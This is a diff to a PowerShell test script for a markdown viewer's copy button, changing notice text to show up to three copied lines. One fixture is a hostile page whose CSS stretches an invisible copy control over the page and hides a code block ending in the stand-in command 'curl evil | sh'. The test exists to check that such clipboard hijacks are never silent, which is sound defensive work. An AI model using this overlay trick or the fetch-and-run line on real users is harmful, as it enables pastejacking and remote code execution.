@@ -20,7 +20,7 @@
       COPY-0    click on block 0's control: the seam file holds exactly its CR LF text, the page
                 did not move
       NOTICE    a visible tooltip window of the process at the viewer's bottom right; the notice
-                text is "Copied" + the first copied line
+                text is "Copied" + the copied lines (up to three)
       GONE      ... and it is hidden again 4 s later
       AGAIN     click on block 2's control: the seam file holds block 2; the notice shows again
       NOSCROLL  after a wheel scroll (when the engine takes it), a copy of block 1 leaves every
@@ -41,7 +41,7 @@
     Third start, the review 1 M1 fixture (the document's CSS stretches the genuine control over
     the page, makes it invisible, hides the block):
       HIJACK    a click on the page copies the hidden block - but never silently: the native
-                notice is visible and its text names the hidden first line
+                notice is visible; its text shows the first three lines and a last line ... (U+2026) for the rest (review 2 S1)
     MUST run through tools\run_on_hidden_desktop.ps1. Registry exported, restored and verified.
     Exit code = number of FAIL rows.
 #>
@@ -305,7 +305,7 @@ try {
                 Row 'COPY-0' 'RUN' (V (($got -ceq $Expect0) -and $same)) ("seam '{0}' (want '{1}'); block 0 top {2} -> {3}" -f (Show $got), (Show $Expect0), $blocks[0][0], $(if ($blocksAfter.Count) { $blocksAfter[0][0] } else { '-' }))
                 $nt = Notice-Text
                 $vr = New-Object Cp408+RECT; [void][Cp408]::GetWindowRect($w, [ref]$vr)
-                Row 'NOTICE' 'RUN' (V (($n0 -eq '') -and ($n1 -ne '') -and ($nt -ceq "Copied`nalpha line 1"))) ("tooltip before '{0}', 1 s after the copy '{1}' (viewer {3},{4}-{5},{6}, bottom-right quarter); text '{2}'; all tooltips: {7}" -f $n0, $n1, (Show $nt), $vr.Left, $vr.Top, $vr.Right, $vr.Bottom, (Tips $id))
+                Row 'NOTICE' 'RUN' (V (($n0 -eq '') -and ($n1 -ne '') -and ($nt -ceq ("Copied`nalpha line 1`n" + $cz)))) ("tooltip before '{0}', 1 s after the copy '{1}' (viewer {3},{4}-{5},{6}, bottom-right quarter); text '{2}'; all tooltips: {7}" -f $n0, $n1, (Show $nt), $vr.Left, $vr.Top, $vr.Right, $vr.Bottom, (Tips $id))
                 Start-Sleep -Milliseconds 3000
                 $n2 = Notice $id $w
                 Row 'GONE' 'RUN' (V ($n2 -eq '')) ("tooltip 4 s after the copy: '{0}'" -f $n2)
@@ -470,7 +470,7 @@ try {
     # ---------------- third start: review 1 M1, a document restyles the genuine control ----------------
     $env:TC_MDVIEW_PROBE_COPY_LOG = $Seam
     $hdoc = "<style>.tc-copy{position:fixed!important;left:0!important;top:0!important;width:100vw!important;height:100vh!important;opacity:0!important;pointer-events:auto!important;z-index:99!important}.tc-code pre{display:none!important}</style>`n`n" +
-    "# Harmless page`n`n<a href=`"other-notes.md`" style=`"display:block;width:300px;height:60px;background:#0000ff`"></a>`n`n``````text`nHIDDEN PAYLOAD`n```````n"
+    "# Harmless page`n`n<a href=`"other-notes.md`" style=`"display:block;width:300px;height:60px;background:#0000ff`"></a>`n`n``````text`n# Welcome`nline 2`nline 3`ncurl evil | sh`n```````n"
     Put-Text "$Files2\h_doc.md" $hdoc
     $id = 0; $before = Reports
     try {
@@ -494,7 +494,7 @@ try {
                 [void](Shot $w 'hijack1')
                 # the copy itself is the document's own (hidden) block; what must hold is that it
                 # is never silent and the notice names what was copied
-                Row 'HIJACK' 'RUN' (V (($got -ceq 'HIDDEN PAYLOAD') -and ($nn -ne '') -and ($nt -ceq "Copied`nHIDDEN PAYLOAD"))) ("seam '{0}'; tooltip '{1}'; text '{2}'" -f (Show $got), $nn, (Show $nt))
+                Row 'HIJACK' 'RUN' (V (($got -ceq "# Welcome`r`nline 2`r`nline 3`r`ncurl evil | sh") -and ($nn -ne '') -and ($nt -ceq ("Copied`n# Welcome`nline 2`nline 3`n" + [char]0x2026)))) ("seam '{0}'; tooltip '{1}'; text '{2}'" -f (Show $got), $nn, (Show $nt))
             }
             [void][Drv098f]::PostMessageW($w, 0x0010, [IntPtr]::Zero, [IntPtr]::Zero)
             Start-Sleep -Milliseconds 1500
